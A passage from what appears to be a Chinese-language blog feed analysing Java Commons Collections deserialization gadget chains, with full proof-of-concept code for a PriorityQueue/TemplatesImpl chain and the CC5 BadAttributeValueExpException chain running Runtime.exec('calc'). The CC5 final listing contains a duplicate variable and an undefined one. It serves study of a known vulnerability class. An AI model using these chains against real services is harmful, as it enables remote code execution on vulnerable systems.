<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//动态加载</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br></code></pre></td></tr></table></figure>

<p>接下来就用<code>TransformingComparator</code>去调用<code>chainedTransformer</code>的<code>transformers()</code>方法</p>
<p>TransformingComparator的构造函数能直接传入transformers</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601125540711.png" alt="image-20240601125540711"></p>
<p>PriorityQueue的构造函数能直接传入comparator</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601125701669.png" alt="image-20240601125701669"></p>
<p>走到这逻辑其实就走完了，当我们运行一下，发现其实并不能正常运行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//动态加载</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(1);</span><br><br><br>        <span class="hljs-comment">//调用 ChainedTransformer.transform()</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-comment">//PriorityQueue调用TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="调试代码"><a href="#调试代码" class="headerlink" title="调试代码"></a>调试代码</h3><p>根据这个调用链去调试一下</p>
<p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130436070.png" alt="image-20240601130436070"></p>
<p>进入<code>heapify()</code>方法中我们想调用<code>siftDown()</code></p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-type">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) <span class="hljs-comment">//发现这个判断过不去</span><br>        <span class="hljs-built_in">siftDown</span>(i, (E) queue[i]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130808273.png" alt="image-20240601130808273"></p>
<p>size大小最低为2的时候才能过这个判断，进入<code>siftDown()</code>（size表示队列中当前元素的数量）</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601130816243.png" alt="image-20240601130816243"></p>
<p>所以我们知道了需要至少两个元素，当我们有两个元素之后，序列化的时候执行了所有代码</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601131409516.png" alt="image-20240601131409516"></p>
<p>因为<code>add()</code>方法最终会执行到<code>compare()</code>方法，导致序列化的时候就运行。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240601223552106.png" alt="image-20240601223552106"></p>
<p>那这并不是我们想要的，我们想要他反序列化的时候执行。  </p>
<p>修改方法如下:</p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//执行代码的类</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-comment">//动态加载</span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class), instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(1);</span><br><br><br><br><br>    <span class="hljs-comment">//调用 ChainedTransformer.transform()。(这里放的是ConstantTransformer&lt;&gt;()，目的是序列化的时候不让这条链执行)</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>       <span class="hljs-comment">//PriorityQueue调用TransformingComparator.compare()</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>		<br>        <span class="hljs-comment">//反射修改transformingComparator的值为transformer，让其反序列化的时候让链连接起来</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformerField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformerField.set(transformingComparator, chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC5</title>
    <url>/2024/06/02/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC5/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本质上也就是前面几条CC链改来改去，换了一个入口类。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC5.png" alt="CC5"></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>JDK8u65</li>
<li>commons-collections 3.2.1</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>从上图可以看出来还是通过<code>LazyMap</code>调用<code>ChainedTransformer.transform()</code>最终调用<code>InvokerTransformer.transform()</code>执行代码</p>
<p>思路是一样的，找谁调用了<code>get()</code>方法，2000+结果，凭我们自己可能很难找到了，ysoserial中最终是找到了<code>TiedMapEntry.toString()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602153105891.png" alt="image-20240602153105891"></p>
<p><code>TiedMapEntry.toString</code>调用了<code>getValue()</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602151949039.png" alt="image-20240602151949039"></p>
<p><code>TiedMapEntry.getValue()</code>最终调用了<code>get()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152006941.png" alt="image-20240602152006941"></p>
<p>那接着就是找谁调用了<code>toString()</code>方法最好是在<code>readObject()</code>中，最终找到了<code>BadAttributeValueExpException.readObject()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152124747.png" alt="image-20240602152124747"></p>
<h2 id="CC5编写"><a href="#CC5编写" class="headerlink" title="CC5编写"></a>CC5编写</h2><p>从上面的图也可以看出来后半部分链其实和CC1或者CC6是一样的，复制粘贴没什么好说的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);<br>        <br> <span class="hljs-comment">//TiedMapEntry放入lazymap，TiedMapEntry的构造器中第一个为Map，第二个为Object。所以map就可以传入我们构造好的lazymap</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-number">1</span>);<br> <br><span class="hljs-comment">//构思是反序列化自动执行BadAttributeValueExpException.readObject()，因为BadAttributeValueExpException放入的是tiedMapEntry，那就会执行tiedMapEntry的readObject()</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br>        <br></code></pre></td></tr></table></figure>

<h3 id="序列化自动执行的问题"><a href="#序列化自动执行的问题" class="headerlink" title="序列化自动执行的问题"></a>序列化自动执行的问题</h3><p>写了上面的代码发现，序列化的时候就自动执行了。调试一下就就知道，在<code>BadAttributeValueExpException</code>的构造器直接调用了<code>toString()</code>方法，导致序列化的时候执行完毕。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602154714433.png" alt="image-20240602154714433"></p>
<p>解决办法就是通过反射先放一个没用的东西在里面，序列化之前再把<code>tiedMapEntry</code>放进去。</p>
<p><code>BadAttributeValueExpException</code>也支持序列化，虽然当前类没有直接继承<code>Serializable</code>接口，但是它祖类<code>Throwable</code>继承了Serializable接口，所以<code>BadAttributeValueExpException</code>也支持序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Object<br>  ↳ java.lang.Throwable<br>    ↳ java.lang.Exception<br>      ↳ javax.management.BadAttributeValueExpException<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240602152143747.png" alt="image-20240602152143747"></p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);<br>        <br> <span class="hljs-comment">//TiedMapEntry放入lazymap，TiedMapEntry的构造器中第一个为Map，第二个为Object。所以map就可以传入我们构造好的lazymap</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-number">1</span>);<br> <br><span class="hljs-comment">//构思是反序列化自动执行BadAttributeValueExpException.readObject()，因为BadAttributeValueExpException放入的是tiedMapEntry，那就会执行tiedMapEntry的readObject()</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br>		<br>        <span class="hljs-comment">//反射修改值</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BadAttributeValueExpException</span>&gt; c = badAttributeValueExpException.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(badAttributeValueExpException, tiedMapEntry);<br><br><br>        serialize(badAttributeValueExpException1);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化CommonsCollections篇(四)-摆烂的完结篇</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC3</title>
    <url>/2024/05/27/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC3/</url>
